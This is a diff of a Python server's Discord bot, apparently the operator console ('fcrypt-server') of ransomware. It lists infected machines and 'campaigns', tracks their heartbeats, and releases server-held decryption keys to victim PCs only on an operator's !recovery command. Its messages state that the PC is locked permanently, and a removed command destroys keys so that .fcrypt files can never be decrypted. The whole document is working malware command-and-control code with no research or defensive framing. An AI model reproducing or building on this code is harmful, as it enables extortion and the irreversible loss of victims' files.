@@ -608,9 +608,7 @@ def unlock():
 # ---- Discord bot ----
 
 _BOT_LOCK_FD = None
-_BOT_STATE = {"alive": False, "connected": False, "user": None,
-              "error": None, "started_at": 0}
-
+_BOT_STATE = {"alive": False, "connected": False, "user": None, "error": None, "started_at": 0}
 
 def _try_acquire_bot_lock():
     global _BOT_LOCK_FD
@@ -623,13 +621,11 @@ def _try_acquire_bot_lock():
     except Exception:
         return False
 
-
 def _discord_bot_main(token: str):
     _BOT_STATE["alive"] = True
     _BOT_STATE["started_at"] = time.time()
     import logging
-    logging.basicConfig(level=logging.INFO,
-        format="[%(asctime)s] [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
+    logging.basicConfig(level=logging.INFO, format="[%(asctime)s] [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
     logging.getLogger("discord").setLevel(logging.WARNING)
     try:
         import discord
@@ -638,6 +634,7 @@ def _discord_bot_main(token: str):
         _BOT_STATE["error"] = f"discord.py indisponible ({e})"
         print(f"[bot] {_BOT_STATE['error']}")
         return
+        
     print(f"[bot] bot.run imminent — token={token[:8]}… admin_ids={DISCORD_ADMIN_IDS}")
     import asyncio
     try:
@@ -675,17 +672,11 @@ def _discord_bot_main(token: str):
     async def _help_cmd(ctx):
         if not _admin(ctx):
             await ctx.send(embed=_embed("Accès refusé", COL_ERR)); return
-        await ctx.send(embed=_embed("Commandes — Option A", COL_INFO,
-            "Le session_key n'est plus sur le client. Toute récupération passe par le serveur.",
+        await ctx.send(embed=_embed("Commandes Opérateur", COL_INFO,
+            "Le PC est verrouillé définitivement. Seul `!recovery` peut déclencher le déchiffrement.",
             fields=[
-                ("!list", "Machines + campagnes.", False),
-                ("!lock <machine_id>", "Lock machine + campagnes.", False),
-                ("!unlock <machine_id>", "Déverrouille (reset).", False),
-                ("!recovery <machine_id>", "Arme la récupération (toutes campagnes).", False),
-                ("!recovery_c <campaign_id>", "Arme la récupération (campagne précise).", False),
-                ("!allow_unlock <campaign_id> <answer>", "Autorise /unlock.", False),
-                ("!deny_unlock <campaign_id>", "Désactive /unlock.", False),
-                ("!forget <machine_id>", "Détruit les clés serveur. IRRÉVERSIBLE.", False),
+                ("!list", "Affiche les machines et leurs IDs complets.", False),
+                ("!recovery <machine_id>", "Déclenche le déchiffrement à distance.", False),
             ], footer=f"fcrypt-server v1.1.0 · par {ctx.author}"))
 
     @bot.command(name="list")
@@ -708,9 +699,7 @@ def _discord_bot_main(token: str):
         for mid in mids[:20]:
             hs = float(snap_h.get("h:" + mid, {}).get("last_seen", 0))
             online = bool(hs) and (now - hs) <= HEARTBEAT_TTL
-            locked = _is_machine_locked(mid)
             status = "✅ en ligne" if online else "❌ hors ligne"
-            if locked: status += " · 🔒"
             ago = "jamais vu" if not hs else f"vu il y a {_human_delta(now - hs)}"
             
             lines = [f"**Machine ID** :\n`{mid}`", f"{status} · {ago}"]
@@ -720,40 +709,15 @@ def _discord_bot_main(token: str):
                 for cid, cv in campaigns.get(mid, []):
                     cs = cv.get("status", "?")
                     if cv.get("recovery_pending"): cs += " ⏳ rec"
-                    if cv.get("unlock_armed"): cs += " 🔓 unlock"
                     lines.append(f"`{cid}` ({cs})")
             else:
-                lines.append("_Aucune campagne enregistrée._")
+                lines.append("_Aucune campagne._")
                 
             fields.append((" ", "\n".join(lines), False))
             
         await ctx.send(embed=_embed(f"Machines ({len(mids)})", COL_INFO,
-            f"Option A — server-held keys\n\nClique sur un ID pour le copier.", 
-            fields=fields,
+            "Clique sur un ID pour le copier.", fields=fields,
             footer=f"fcrypt-server v1.1.0 · par {ctx.author}"))
-
-    @bot.command(name="lock")
-    async def _lock_cmd(ctx, mid: str = ""):
-        if not _admin(ctx):
-            await ctx.send(embed=_embed("Accès refusé", COL_ERR)); return
-        mid = mid.strip().lower()
-        if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
-            await ctx.send(embed=_embed("Usage", COL_WARN, "`!lock <machine_id>`")); return
-        n = _lock_machine(mid)
-        await ctx.send(embed=_embed(f"Machine verrouillée — `{mid[:16]}…`", COL_LOCK,
-            f"{n} campagne(s) gelée(s). /unlock et /poll recovery refusés.",
-            footer=f"par {ctx.author}"))
-
-    @bot.command(name="unlock")
-    async def _unlock_cmd(ctx, mid: str = ""):
-        if not _admin(ctx):
-            await ctx.send(embed=_embed("Accès refusé", COL_ERR)); return
-        mid = mid.strip().lower()
-        if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
-            await ctx.send(embed=_embed("Usage", COL_WARN, "`!unlock <machine_id>`")); return
-        n = _unlock_machine(mid)
-        await ctx.send(embed=_embed(f"Machine déverrouillée — `{mid[:16]}…`", COL_OK,
-            f"{n} campagne(s) réactivée(s).", footer=f"par {ctx.author}"))
 
     @bot.command(name="recovery")
     async def _recovery_cmd(ctx, mid: str = ""):
@@ -762,88 +726,15 @@ def _discord_bot_main(token: str):
         mid = mid.strip().lower()
         if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
             await ctx.send(embed=_embed("Usage", COL_WARN, "`!recovery <machine_id>`")); return
-        if _is_machine_locked(mid):
-            await ctx.send(embed=_embed("Récupération refusée", COL_LOCK,
-                "Machine verrouillée. `!unlock` d'abord.")); return
+        
         armed = _arm_recovery(mid)
         if armed:
             await ctx.send(embed=_embed(f"Récupération armée — `{mid[:16]}…`", COL_OK,
-                f"{len(armed)} campagne(s) : {', '.join(c[:10] for c in armed)}\n"
-                f"Le session_key sera renvoyé au prochain /poll (≤ 10 s).",
-                footer=f"par {ctx.author}"))
+                f"{len(armed)} campagne(s) ciblée(s).\n"
+                f"Le PC va recevoir la clé au prochain /poll (≤ 10 s) et se déchiffrer.", footer=f"par {ctx.author}"))
         else:
-            await ctx.send(embed=_embed("Aucune campagne active", COL_WARN,
-                "Machine inconnue ou toutes les campagnes sont locked/recovered."))
-
-    @bot.command(name="recovery_c")
-    async def _recovery_c_cmd(ctx, cid: str = ""):
-        if not _admin(ctx):
-            await ctx.send(embed=_embed("Accès refusé", COL_ERR)); return
-        cid = cid.strip().lower()
-        if not re.fullmatch(r"[0-9a-f]{32}", cid):
-            await ctx.send(embed=_embed("Usage", COL_WARN, "`!recovery_c <campaign_id>`")); return
-        ok = _arm_recovery_campaign(cid)
-        if ok:
-            await ctx.send(embed=_embed(f"Récupération armée — `{cid[:10]}…`", COL_OK,
-                "Le session_key sera renvoyé au prochain /poll.", footer=f"par {ctx.author}"))
-        else:
-            await ctx.send(embed=_embed("Échec", COL_LOCK,
-                "Campagne inconnue, locked, ou machine verrouillée."))
-
-    @bot.command(name="allow_unlock")
-    async def _allow_unlock_cmd(ctx, cid: str = "", *, answer: str = ""):
-        if not _admin(ctx):
-            await ctx.send(embed=_embed("Accès refusé", COL_ERR)); return
-        cid = cid.strip().lower()
-        if not re.fullmatch(r"[0-9a-f]{32}", cid):
-            await ctx.send(embed=_embed("Usage", COL_WARN,
-                "`!allow_unlock <campaign_id> <answer>`")); return
-        _refresh_state()
-        with _state_lock:
-            c = STATE.get("c:" + cid)
-            if c is None:
-                await ctx.send(embed=_embed("Campagne inconnue", COL_WARN)); return
-            c["unlock_armed"] = True
-            c["expected_answer"] = answer
-            _save_state(STATE)
-        await ctx.send(embed=_embed(f"/unlock armé — `{cid[:10]}…`", COL_OK,
-            f"Réponse attendue : `{answer}`", footer=f"par {ctx.author}"))
-
-    @bot.command(name="deny_unlock")
-    async def _deny_unlock_cmd(ctx, cid: str = ""):
-        if not _admin(ctx):
-            await ctx.send(embed=_embed("Accès refusé", COL_ERR)); return
-        cid = cid.strip().lower()
-        if not re.fullmatch(r"[0-9a-f]{32}", cid):
-            await ctx.send(embed=_embed("Usage", COL_WARN, "`!deny_unlock <campaign_id>`")); return
-        _refresh_state()
-        with _state_lock:
-            c = STATE.get("c:" + cid)
-            if c is None:
-                await ctx.send(embed=_embed("Campagne inconnue", COL_WARN)); return
-            c["unlock_armed"] = False
-            c.pop("expected_answer", None)
-            _save_state(STATE)
-        await ctx.send(embed=_embed(f"/unlock désarmé — `{cid[:10]}…`", COL_LOCK,
-            footer=f"par {ctx.author}"))
-
-    @bot.command(name="forget")
-    async def _forget_cmd(ctx, mid: str = ""):
-        if not _admin(ctx):
-            await ctx.send(embed=_embed("Accès refusé", COL_ERR)); return
-        mid = mid.strip().lower()
-        if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
-            await ctx.send(embed=_embed("Usage", COL_WARN, "`!forget <machine_id>`")); return
-        _refresh_state()
-        removed = []
-        with _state_lock:
-            for k in list(STATE.keys()):
-                if k.startswith("c:") and isinstance(STATE.get(k), dict) and STATE[k].get("machine_id") == mid:
-                    STATE.pop(k, None); removed.append(k[2:])
-            _save_state(STATE)
-        await ctx.send(embed=_embed(f"Clés détruites — `{mid[:16]}…`", COL_LOCK,
-            f"{len(removed)} campagne(s) supprimée(s). Les .fcrypt ne pourront PLUS JAMAIS être déchiffrés.",
-            footer=f"par {ctx.author}"))
+            await ctx.send(embed=_embed("Échec", COL_WARN,
+                "Aucune campagne active trouvée pour cette machine (déjà récupérée ou ID invalide)."))
 
     try:
         print(f"[bot] appel bot.run(token)…")
